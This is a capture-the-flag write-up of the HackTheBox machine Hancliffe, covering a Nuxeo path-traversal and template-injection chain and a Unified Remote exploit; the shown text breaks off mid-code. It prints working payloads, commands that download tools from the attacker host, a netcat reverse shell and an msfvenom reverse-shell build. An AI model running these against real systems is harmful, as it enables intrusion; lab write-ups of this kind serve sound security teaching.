---
title: HTB: Hancliffe
url: https://0xdf.gitlab.io/2022/03/05/htb-hancliffe.html
date: 2022-03-05T14:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-hancliffe, hackthebox, ctf, nmap, hashpass, nuxeo, uri-parsing, feroxbuster, ssti, java, windows, unified-remote, tunnel, chisel, msfvenom, firefox, firepwd, winpeas, evil-winrm, youtube, htb-seal, htb-logforge, reverse-engineering, ghidra, x32dbg, rot-47, atbash, cyberchef, pattern-create, bof, jmp-esp, metasm, nasm, socket-reuse, shellcode, pwntools, wmic, dep, breaking-parser-logic
---

![Hancliffe](https://0xdfimages.gitlab.io/img/hancliffe-cover.png)

Hancliffe starts with a uri parsing vulnerability that provides access to an internal instance of Nuxeo, which is vulnerable to a Java server-side template injection that leads to RCE. With a foothold, I can tunnel to access an instance of Universal Remote, which allows RCE as the next user. That user has a stored password in Firefox for H@$hPa$$, which gives the password for the next user. Finally, this user has access to a development application that is vulnerable to an interesting and tricky buffer overflow, where I’ll have to jump around on the stack and use socket reuse to get execution as administrator.

## Box Info

| Name | [Hancliffe](https://hackthebox.com/machines/hancliffe)  [Hancliffe](https://hackthebox.com/machines/hancliffe) [Play on HackTheBox](https://hackthebox.com/machines/hancliffe) |
| --- | --- |
| Release Date | [09 Oct 2021](https://twitter.com/hackthebox_eu/status/1446128698101428227) |
| Retire Date | 05 Mar 2022 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Hancliffe |
| Radar Graph | Radar chart for Hancliffe |
| First Blood User | 01:59:57[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 02:47:51[xct xct](https://app.hackthebox.com/users/13569) |
| Creator | [Revolt Revolt](https://app.hackthebox.com/users/189435) |

## Recon

### nmap

`nmap` found three open TCP ports, two HTTP (80, 8000) and a custom application (9999):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.115
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-26 22:21 EST
Nmap scan report for 10.10.11.115
Host is up (0.091s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 13.50 seconds
oxdf@hacky$ nmap -p 80,8000,9999 -sCV -oA scans/nmap-tcpscripts 10.10.11.115
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-26 22:22 EST
Nmap scan report for 10.10.11.115
Host is up (0.095s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: Welcome to nginx!
8000/tcp open  http    nginx 1.21.0
|_http-server-header: nginx/1.21.0
|_http-title: HashPass | Open Source Stateless Password Manager
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: 
|     Welcome Brankas Application.
|     Username: Password:
|   NULL: 
|     Welcome Brankas Application.
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=1/26%Time=61F2100C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,27,"Welcome\x20Brankas\x20Application\.\nUsername:\x20")%r(GetReques
SF:t,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(HTTPOptions,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pa
SF:ssword:\x20")%r(FourOhFourRequest,31,"Welcome\x20Brankas\x20Application
SF:\.\nUsername:\x20Password:\x20")%r(JavaRMI,31,"Welcome\x20Brankas\x20Ap
SF:plication\.\nUsername:\x20Password:\x20")%r(GenericLines,31,"Welcome\x2
SF:0Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(RTSPRequest,3
SF:1,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(
SF:RPCCheck,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password
SF::\x20")%r(DNSVersionBindReqTCP,31,"Welcome\x20Brankas\x20Application\.\
SF:nUsername:\x20Password:\x20")%r(DNSStatusRequestTCP,31,"Welcome\x20Bran
SF:kas\x20Application\.\nUsername:\x20Password:\x20")%r(Help,31,"Welcome\x
SF:20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(SSLSessionRe
SF:q,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(TerminalServerCookie,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20")%r(TLSSessionReq,31,"Welcome\x20Brankas\x20Applic
SF:ation\.\nUsername:\x20Password:\x20")%r(Kerberos,31,"Welcome\x20Brankas
SF:\x20Application\.\nUsername:\x20Password:\x20")%r(SMBProgNeg,31,"Welcom
SF:e\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(X11Probe,
SF:31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r
SF:(LDAPSearchReq,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Pa
SF:ssword:\x20")%r(LDAPBindReq,31,"Welcome\x20Brankas\x20Application\.\nUs
SF:ername:\x20Password:\x20")%r(SIPOptions,31,"Welcome\x20Brankas\x20Appli
SF:cation\.\nUsername:\x20Password:\x20")%r(LANDesk-RC,31,"Welcome\x20Bran
SF:kas\x20Application\.\nUsername:\x20Password:\x20")%r(TerminalServer,31,
SF:"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")%r(NC
SF:P,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Password:\x20")
SF:%r(NotesRPC,31,"Welcome\x20Brankas\x20Application\.\nUsername:\x20Passw
SF:ord:\x20")%r(WMSRequest,31,"Welcome\x20Brankas\x20Application\.\nUserna
SF:me:\x20Password:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.93 seconds

```

With the exposed ports I don’t know much about the OS, let alone the OS version.

I can make a good guess about the OS using ICMP packets, specifically their time-to-live (TTL) value. [This post](https://subinsb.com/default-device-ttl-values/) has details on *tons* of OSes, but also includes this summary chart:

![image-20220303140212816](https://0xdfimages.gitlab.io/img/image-20220303140212816.png)

A `ping` of Hancliffe returns packets with TTL of 127:

```

oxdf@hacky$ ping -c 5 10.10.11.115
PING 10.10.11.115 (10.10.11.115) 56(84) bytes of data.
64 bytes from 10.10.11.115: icmp_seq=1 ttl=127 time=199 ms
64 bytes from 10.10.11.115: icmp_seq=2 ttl=127 time=122 ms
64 bytes from 10.10.11.115: icmp_seq=3 ttl=127 time=141 ms
64 bytes from 10.10.11.115: icmp_seq=4 ttl=127 time=86.8 ms
64 bytes from 10.10.11.115: icmp_seq=5 ttl=127 time=86.2 ms
--- 10.10.11.115 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4009ms
rtt min/avg/max/mdev = 86.201/127.035/199.426/41.813 ms

```

I reasonable inference would be that this is a Windows host, and the packet left with TTL 128, which was decremented by one to 127 at the router between it and me (10.10.10.2).

### Brankas Application - TCP 9999

Connecting to TCP 9999 with `nc` returns a prompt to log in:

```

oxdf@hacky$ nc 10.10.11.115 9999
Welcome Brankas Application.
Username:

```

When I try with random creds, it fails and just hangs open:

```

oxdf@hacky$ nc 10.10.11.115 9999
Welcome Brankas Application.
Username: 0xdf
Password: 0xdf
Username or Password incorrect

```

I tried sending long strings, but didn’t seem to crash the application.

### Website - TCP 8000

#### Site

The site is an instance of H@$hPa$$:

[![image-20220127161425353](https://0xdfimages.gitlab.io/img/image-20220127161425353.png)](https://0xdfimages.gitlab.io/img/image-20220127161425353.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220127161425353.png)

The site for this software is [here](https://scottparry.co/labs/hashpass/), and the code is on [GitHub](https://github.com/scottparry/hashpass).

The idea is that I give it my full name, the website name, my master password, and it calculates a password for me:

![image-20220127161732312](https://0xdfimages.gitlab.io/img/image-20220127161732312.png)

Now as long as I can remember my master password (and my name), I can fetch my password for any site by having the site regenerate it. This doesn’t seem like a great idea, especially since the calculation isn’t done client-side, but rather the master password and other generating information is sent in a POST request to the site and the calculated password is returned.

#### Tech Stack

The headers do show NGINX to match `nmap`. There’s also a PHP version, 8.0.7. Trying `index.php` does return the same page as `/`. There’s an `index.php` at the root of the repo:

![image-20220127162210240](https://0xdfimages.gitlab.io/img/image-20220127162210240.png)

Turn out that `README.md` and `LICENCE` are on this webserver as well. Good to know it matches the repo, but doesn’t really help with hacking Hancliffe at the moment.

### Website - TCP 80

#### Site

Visiting the page just returns the NGINX default page:

![image-20220126214030187](https://0xdfimages.gitlab.io/img/image-20220126214030187.png)

#### Tech Stack

The HTTP response headers don’t give anything else other than NGINX and the version:

```

HTTP/1.1 200 OK
Server: nginx/1.21.0
Date: Thu, 27 Jan 2022 02:40:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 612
Last-Modified: Tue, 25 May 2021 12:28:56 GMT
Connection: close
ETag: "60aced88-264"
Accept-Ranges: bytes

```

The index page loads as `/index.html`. That’s not much of a hint, but does make it less likely to be something Python or Ruby based.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and included a few extensions as guesses to see if I can get a clue as to what’s running:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.115 -x php,asp,aspx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.115
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [php, asp, aspx]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.10.11.115/maintenance => /nuxeo/Maintenance/
302      GET        0l        0w        0c http://10.10.11.115/Maintenance => /nuxeo/Maintenance/
500      GET       21l       62w      494c http://10.10.11.115/con
500      GET       21l       62w      494c http://10.10.11.115/con.aspx
500      GET       21l       62w      494c http://10.10.11.115/error%1F_log
500      GET       21l       62w      494c http://10.10.11.115/error%1F_log.php
500      GET       21l       62w      494c http://10.10.11.115/error%1F_log.asp
500      GET       21l       62w      494c http://10.10.11.115/error%1F_log.aspx
[####################] - 3m    119996/119996  0s      found:8       errors:0      
[####################] - 3m    119996/119996  539/s   http://10.10.11.115 

```

The fact that the urls seem case-insensitive is another hint that this box is running Windows. And then `con.aspx` suggests ASP.NET, even if it’s crashing, but there are also error pages in `.php`, `.asp`, and `.aspx`, so that could really be anything.

[Nuxeo](https://www.nuxeo.com/) is a content management system (CMS), and looking on their page for developers, it looks to be built in Java / JavaScript, based on the images on their site:

![image-20220126214803198](https://0xdfimages.gitlab.io/img/image-20220126214803198.png)

## Shell as svc\_account

### Abusing URI Normalization

#### Background

For the service on port 80, it is clear there’s a Java-based application (Nuxeo) running behind NGINX, which provides an opportunity to abuse path normalization issues. I’ve shown these a couple times before (in [LogForge](/2021/12/29/htb-logforge.html#access-manager) and [Seal](/2021/11/13/htb-seal.html#access-tomcat-manager)). The idea was first presented by Orange Tsai at Blackhat 2018 in [Breaking Parser Logic: Take Your Path Normilzation Off and Pop 0days Out](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf). The idea is to look at how different software handle odd URIs, and abuse the differences when there are two or more involved. For example (a couple of slides from that presentation):

![image-20220127070621262](https://0xdfimages.gitlab.io/img/image-20220127070621262.png)

This case is similar to this image, where Hancliffe doesn’t have Tomcat, but another Java-based application:

![image-20220127070715895](https://0xdfimages.gitlab.io/img/image-20220127070715895.png)

#### Path Exploration

If I enter `/maintenance/..;/` into Firefox, I end up at a 404 page with the URL `/nuxeo/nxstartup.faces`. Looking in Burp, the original url returned a 302 redirect to that URL. That’s definitely something different.

I suspect I don’t have access to this page as well, but perhaps `/maintenance/..;/nuxeo/nxstartup.faces`? Visiting this results in a redirect to `/nuxeo/login.jsp`. The redirect is different this time, as the request returned a 401 Not Authorized, with a redirect in in-line JavaScript:

```

HTTP/1.1 401 
Server: nginx/1.21.0
Date: Thu, 27 Jan 2022 19:01:41 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 220
Connection: close
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=10; IE=11
Cache-Control: no-cache, no-store, must-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *
X-XSS-Protection: 1; mode=block
Set-Cookie: JSESSIONID=9D4D584CEA9A4CA9858AFC2362A7752F.nuxeo; Path=/nuxeo; HttpOnly

<script type="text/javascript">
document.cookie = 'nuxeo.start.url.fragment=' + encodeURIComponent(window.location.hash.substring(1) || '') + '; path=/';
window.location = 'http://10.10.11.115/nuxeo/login.jsp';
</script>

```

Visiting `/maintenance/..;/nuxeo/login.jsp` returns a 404:

![image-20220127140615641](https://0xdfimages.gitlab.io/img/image-20220127140615641.png)

#### Feroxbuster

I’ll give `feroxbuster` try to look for other paths on `/maintenance/..;` including `.jsp` extensions (originally I included `.faces` as well, but there were *tons* of 401 errors)

```

oxdf@hacky$ feroxbuster -u 'http://10.10.11.115/maintenance/..;' -x jsp 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.115/maintenance/..;
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💲  Extensions            │ [jsp]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/login
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/logout
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/user
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/scripts => /nuxeo/Maintenance/..;/scripts/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/css => /nuxeo/Maintenance/..;/css/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/img => /nuxeo/Maintenance/..;/img/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/search => /nuxeo/Maintenance/..;/search/
200      GET      450l      882w        0c http://10.10.11.115/maintenance/..;/login.jsp
200      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/js
500      GET      106l      269w     2396c http://10.10.11.115/maintenance/..;/api
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/pages => /nuxeo/Maintenance/..;/pages/
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/site
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/users => /nuxeo/Maintenance/..;/users/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/resources => /nuxeo/Maintenance/..;/resources/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/index.jsp => http://10.10.11.115/nuxeo/nxstartup.faces
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/directory => /nuxeo/Maintenance/..;/directory/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/icons => /nuxeo/Maintenance/..;/icons/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/widgets => /nuxeo/Maintenance/..;/widgets/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/layouts => /nuxeo/Maintenance/..;/layouts/
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/group
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/tinymce => /nuxeo/Maintenance/..;/tinymce/
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/webservices
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/ws
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/incl => /nuxeo/Maintenance/..;/incl/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/analytics => /nuxeo/Maintenance/..;/analytics/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/ui => /nuxeo/Maintenance/..;/ui/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/Maintenance => /nuxeo/Maintenance/..;/Maintenance/
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/viewer
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/oauth
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/authentication
200      GET       94l      272w     2456c http://10.10.11.115/maintenance/..;/page_not_found.jsp
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/permissions => /nuxeo/Maintenance/..;/permissions/
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/pagination => /nuxeo/Maintenance/..;/pagination/
401      GET        4l       16w      220c http://10.10.11.115/maintenance/..;/startup
302      GET        0l        0w        0c http://10.10.11.115/maintenance/..;/viewers => /nuxeo/Maintenance/..;/viewers/
[####################] - 3m     59998/59998   0s      found:35      errors:0      
[####################] - 3m     59998/59998   296/s   http://10.10.11.115/maintenance/..; 

```

Of the things that returned 200, one was `/maintenance/..;/login.jsp`, which presents the Nuxeo login form:

![image-20220127143725835](https://0xdfimages.gitlab.io/img/image-20220127143725835.png)

### Nuxeo Vulnerability

#### Background

The bottom of the login page says Nuxeo is running version 10.2. Some Googling for “Nuxeo 10 exploit” leads to [this repo](https://github.com/mpgn/CVE-2018-16341) about CVE-2018-16341, which the author calls “Nuxeo Authentication Bypass Remote Code Execution”.

There is a server-side template injection in the Java application, which means if I can include a string like `${-7+7}` somewhere that it will be parsed as code, then I can get Java running and therefore get remote code execution.

#### Testing

To test for this, the repo suggests visiting the url:

```

http://127.0.0.1:8080/nuxeo/login.jsp/pwn${-7+7}.xhtml"

```

There’s been code execution if `${-7+7}` is replaced with a `0`.

Updating the URI to reach the the login page on Hancliffe works:

![image-20220127144904131](https://0xdfimages.gitlab.io/img/image-20220127144904131.png)

#### Manual POC

The page also suggests this payload for RCE:

```

${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("touch /tmp/pwn.txt", null).waitFor()}

```

This is abusing Java to `touch` a file. I’ll modify the payload ping my host which I can watch for with `tcpdump`:

```

${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime", null).invoke(null, null).exec("ping 10.10.14.6", null).waitFor()}

```

When I update the url in Firefox, I see pings at my listening `tcpdump`:

[![](https://0xdfimages.gitlab.io/img/hancliffe-rce-poc-ping.gif)*Click for full size image*](https://0xdfimages.gitlab.io/img/hancliffe-rce-poc-ping.gif)

(It is a bit odd that there are only four pings in that GIF… the default for Windows is typically five.)

### Shell

I tried a handful of things that didn’t work to get a reverse shell. I eventually settled on uploading `nc` using `powershell -c curl 10.10.14.6/nc64.exe -outfile \programdata\nc64.exe`, and then triggering it with `powershell -c \programdata\nc64.exe -e powershell 10.10.14.6 443`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115 54865
  
PS C:\Nuxeo> whoami
hancliffe\svc_account

```

I’ve long been a fan of `rlwrap` for improving Windows reverse shells. `-c` adds tab completion, `-A` makes it color aware, and `-r` adds to the completion wordlist.

## Shell as clara

### Enumeration

#### File System

The user’s home directory doesn’t have much interesting. There’s a `.bat` script to start NGINX on the desktop:

```

cd C:\Nginx
C:\Nginx\Start.bat

```

The webserver is configured in `C:\nginx\conf\nginx.conf`. The misconfiguration behind the URL traversal exploitation used above is based on this misconfiguration:

```

        location /maintenance {
            index index.jsp;
            proxy_set_header Host $host;
            proxy_http_version 1.1;
            proxy_redirect off;
            proxy_set_header X-Forwarded-Host $host:$server_port;
            proxy_set_header X-Forwarded-Server $host;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            if ($request_uri ~* "/maintenance(/.*)") { 
                proxy_pass http://127.0.0.1:8080/nuxeo/Maintenance$1; break;
                }
           proxy_pass http://127.0.0.1:8080/nuxeo/Maintenance;
        }

```

When I visit `10.10.11.115/mainenance/..;/login.jsp`, NGINX reads `..;` as a directory name, and passes the request to `http://127.0.0.1:8080/nuxeo/Maintenance/..;/login.jsp`. Then Java sees `..;` as parent directory, so it routes to `/nuxeo/login.jsp`.

The port 8000 service is also defined here:

```

    # another virtual host using mix of IP-, name-, and port-based configuration
    #
    server {
        listen       8000;
        server_name  localhost;

        root   www;
        location / {
            index index.php index.html index.htm;
        }

        location ~ \.php$ {
            fastcgi_pass   127.0.0.1:8888;
            fastcgi_index  index.php;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
            include        fastcgi_params;
        }
    }

```

There are many more folders in `C:\` than usual:

```

PS C:\> ls

    Directory: C:\
    
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/14/2021  10:57 AM                DevApp
d-----         6/26/2021  10:45 PM                nginx
d-----         6/26/2021   5:16 AM                Nuxeo
d-----         12/7/2019   1:14 AM                PerfLogs
d-----         6/26/2021   8:49 PM                php
d-r---         8/27/2021   7:20 AM                Program Files
d-r---         6/26/2021  10:15 PM                Program Files (x86)
d-r---         6/26/2021  10:35 PM                Users
d-----         10/3/2021  11:08 PM                Windows

```

Most I can explain, but `DevApp` is new. svc\_account doesn’t have access:

```

PS C:\> cd devapp
PS C:\devapp> ls
ls : Access to the path 'C:\devapp' is denied.
At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : PermissionDenied: (C:\devapp:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

#### Network Services

I generated this PowerShell one-liner (informed by [this post](https://adamtheautomator.com/netstat-port/)) to print the listening TCP ports with their process names:

```

PS C:\> Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | Format-Table -Property LocalAddress,LocalPort,OwningProcess,ProcessName

LocalAddress LocalPort OwningProcess ProcessName    
------------ --------- ------------- -----------    
::               49668           640 services       
::               49667          1088 svchost        
::               49666          1132 svchost        
::               49665           500 wininit        
::               49664           660 lsass          
::               47001             4 System         
::                5985             4 System         
::                5432          3596 postgres       
::                 445             4 System         
::                 135           884 svchost        
0.0.0.0          49668           640 services       
0.0.0.0          49667          1088 svchost        
0.0.0.0          49666          1132 svchost        
0.0.0.0          49665           500 wininit        
0.0.0.0          49664           660 lsass          
0.0.0.0           9999          2752 svchost        
0.0.0.0           9609          7992 MyFirstApp     
0.0.0.0           9512          7016 RemoteServerWin
0.0.0.0           9510          7016 RemoteServerWin
127.0.0.1         9300          7108 java           
127.0.0.1         9200          7108 java           
127.0.0.1         8888          6600 php-cgi        
127.0.0.1         8080          7108 java           
127.0.0.1         8009          7108 java           
127.0.0.1         8005          7108 java           
0.0.0.0           8000          2452 nginx          
0.0.0.0           5432          3596 postgres       
0.0.0.0           5040          4668 svchost        
10.10.11.115       139             4 System         
0.0.0.0            135           884 svchost        
0.0.0.0             80          2452 nginx  

```

There a few of these that require further investigation. I was unable to locate the path to `MyFirstApp`. Since that’s listening on 9999, I’m guessing I’ll find the source or binary for it at some point and have a pwn challenge.

Googling for `RemoteServerWin.exe` [shows](https://www.file.net/process/remoteserverwin.exe.html) it’s associated with the Unified Remote, and I’ll find the file located in `C:\Program Files (x86)\Unified Remote 3`:

```

PS C:\Program Files (x86)\Unified Remote 3> ls

    Directory: C:\Program Files (x86)\Unified Remote 3

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/12/2021  12:21 AM                Manager
d-----         6/12/2021  12:21 AM                uvhid
-a----         5/29/2017   4:55 AM        1846272 libcryptoMD.dll
-a----         5/29/2017   4:55 AM         382976 libsslMD.dll
-a----         11/3/2020   4:50 PM        3243784 RemoteServerWin.exe
-a----         6/12/2021  12:21 AM         183608 unins000.dat
-a----         6/12/2021  12:19 AM        2580744 unins000.exe
-a----         6/12/2021  12:21 AM          23277 unins000.msg
-a----        10/10/2016   6:27 AM         556544 wcl.dll
-a----        10/10/2016   5:34 AM         188416 wcl2wbt.dll   

```

### Unified Remote 3 RCE

#### Background

There’s a [remote code execution exploit](https://www.exploit-db.com/exploits/49587) in Unified Remote 3.9.0.2463. Reading the script from ExploitDB, it looks like it connects to TCP 9512, and the uses takes advantage of the application’s ability to run generic windows programs. The script author seems to have understood the binary protocol the server uses to tell the target computer to download a file of HTTP using `certutil` and then run that file.

#### Tunnel

To access TCP 9512, I’ll need to tunnel through my existing shell. For that, I’ll use [Chisel](https://github.com/jpillora/chisel) ([my tutorial here](/cheatsheets/chisel)). I’ll upload the Windows binary using `curl`, and then start the server:

```

oxdf@hacky$ /opt/chisel/chisel_1.7.6_linux_amd64 server -p 8000 --reverse
2022/01/28 16:34:12 server: Reverse tunnelling enabled
2022/01/28 16:34:12 server: Fingerprint 81DUoPbmDjczPL9ZhJsU325vRwcHTwvWav70WALUU0g=
2022/01/28 16:34:12 server: Listening on http://0.0.0.0:8000

```

Now I’ll connect to that port with the client:

```

PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:9512:127.0.0.1:9512
2022/01/28 13:36:41 client: Connecting to ws://10.10.14.6:8000
2022/01/28 13:36:42 client: Connected (Latency 74.2142ms)

```

At the server, it shows the tunnel:

```

2022/01/28 16:36:00 server: session#1: tun: proxy#R:9512=>9512: Listening

```

This is another chance to remind everyone that you must use 127.0.0.1 with Chisel and Windows. By default, Windows will route `localhost` to `::1`, which doesn’t work is the service you are forwarding isn’t on IPv6.

#### Exploit Script Review

I’ll download [the exploit](https://www.exploit-db.com/exploits/49587) and take a look. It’s a legacy Python script. I can get it up to modern Python by replacing all the `.decode('hex')` with `unhexlify` (which I import from `binascii`).

The script takes in three arguments:

```

oxdf@hacky$ python3 unified_remote_rce.py 
Usage: python unified_remote_rce.py <target-ip> <local-http-ip> <payload-name>

```

Looking at the code, the `main` function basically sends a series of commands / keystrokes:

```

def main():
	target.connect((rhost,port))
	sleep(0.5)
	print("[+] Connecting to target...")
	target.sendto(open,(rhost,port)) 	# Initialize Connection to Unified
	sleep(0.02)
	target.sendto(open_fin,(rhost,port)) 	# Finish Initializing Connection
	print("[+] Popping Start Menu")
	sleep(0.02)
	SendWin()
	sleep(0.3)
	print("[+] Opening CMD")
	SendString("cmd.exe", rhost)
	sleep(0.3)
	SendReturn()
	sleep(0.3)
	print("[+] *Super Fast Hacker Typing*")
	SendString("certutil.exe -f -urlcache http://" + lhost + "/" + payload + " C:\\Windows\\Temp\\" + payload, rhost) # Retrieve HTTP hosted payload
	sleep(0.3)
	print("[+] Downloading Payload")
	SendReturn()
	sleep(3)
	SendString("C:\\Windows\\Temp\\" + payload, rhost) # Execute Payload
	sleep(0.3)
	SendReturn()
	print("[+] Done! Check listener?")
	target.close()

```

It’s using `certutil` to download a file from the given IP, saving it in `C:\windows\temp`, and then running it.

#### Generate Payload

Because I need to run something that will give a reverse shell without arguments, I’ll just use `msfvenom` to generate a simple reverse shell binary:

```

oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f exe -o rev.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

Even though I noted that Unified Remote was running out of `Program File (x86)` (and thus a 32-bit process), I can still use a 64-bit payload as the system is 64-bit and the exploit just calls the payload, rather than loading it in the context of the exploited application.

#### Exploit - Fail

I’ll run the script:

```

oxdf@hacky$ python3 unified_remote_rce.py 127.0.0.1 10.10.14.6 rev.exe
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] *Super Fast Hacker Typing*
[+] Downloading Payload
[+] Done! Check listener?

```

When it gets to “Downloading Payload”, there’s a request at my listening Python webserver:

```

oxdf@hacky$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.115 - - [28/Jan/2022 16:53:31] "GET /rev.exe HTTP/1.1" 200 -

```

But I don’t get a callback at `nc`.

#### Exploit Success

`C:\Windows\Temp` can be locked down in a modern Windows system, so it’s possible that I can’t write a payload there. I’ll update the script to write to `C:\programdata` instead:

```

# Main Execution
def main():
    staging_dir = "C:\\programdata\\"
    target.connect((rhost,port))
    sleep(0.5)
    print("[+] Connecting to target...")
